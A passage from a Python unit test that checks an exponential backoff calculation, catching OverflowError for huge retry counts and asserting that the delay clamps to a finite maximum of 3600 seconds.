        Python float exponentiation can raise OverflowError for huge exponents.
        A robust implementation should catch this and clamp to max_delay.
        This test verifies the expected backoff behavior: for very large
        retry counts the delay should always be the max.
        """
        initial_delay = 30.0
        max_delay = 3600.0
        backoff_factor = 2.0
        try:
            raw = initial_delay * (backoff_factor**retry_count)
            delay = min(raw, max_delay)
        except OverflowError:
            # OverflowError means the exponent is astronomically large;
            # the correct behavior is to clamp to max_delay.
            delay = max_delay
        assert delay == max_delay
        assert not math.isinf(delay)
        assert not math.isnan(delay)
